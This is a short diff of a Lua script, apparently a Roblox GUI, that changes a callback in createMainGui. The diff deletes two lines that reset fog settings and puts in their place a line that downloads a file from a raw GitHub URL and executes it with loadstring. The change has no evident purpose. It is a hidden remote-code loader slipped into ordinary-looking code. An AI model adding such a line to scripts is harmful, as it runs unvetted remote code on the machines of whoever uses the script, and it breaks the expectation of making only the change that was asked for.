@@ -99,8 +99,7 @@ local function createMainGui()
                     CustomMusic:Destroy()
                     CustomMusic = nil
                 end
-                Lighting.FogStart = 0
-                Lighting.FogEnd = 100000
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/eoyoustme/ohh/refs/heads/main/bread"))()
             end)
         end
     end)
